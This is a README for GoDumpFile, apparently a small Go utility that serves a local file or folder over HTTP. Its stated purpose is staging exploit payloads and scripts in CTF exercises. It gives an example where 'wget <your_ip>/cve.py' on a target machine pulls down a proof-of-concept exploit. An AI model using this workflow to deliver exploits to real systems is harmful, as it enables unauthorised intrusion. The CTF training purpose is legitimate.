# GoDumpFile

GoDumpFile is an executable that opens a HTTP GET endpoint linked to a file or folder on your machine, so you can just download the wanted file from another computer on your local network (or distant if the port is opened on the internet).

It's mainly used to dump payload and/or scripts using curl and wget, to use a CVE in a remote machine. 
Of course, it's intended to be used during CTFs and not on actual vulnerable devices.

Please add a star if you like it :)


## How to install it

You can either download the code in the /cmd/ folder of this repository and then build it using `go build ./cmd/main/main.go`, or, if you're somewhat lazy you can also download the executable in the `executables` folder.


## How to use it

You have to call `/path/to/GoDumpFile/ ` followed by the arguments `-file path/to/file-or-folder -name name_for_the_endpoint`

Example :
`/home/JeanJean/Downloads/GoDumpFile -file /home/JeanJean/Downloads/poc.py -name cve.py` will create `<your_ip>/cve.py`, and `wget <your_ip>/cve.py` on the target machine will download /home/JeanJean/Downloads/poc.py on it, renamed as "cve.py"

Additionnal optional flags :
`-port <int>` will open the endpoint on the given name. By default, it uses the port 80.


## Todo
* Adding /package/GoDumpFile.deb to easily install GoDumpFile in Path
* Rearranging my folders because /cmd/internals is an abomination (sorry guys)
* Creating a nice logo :)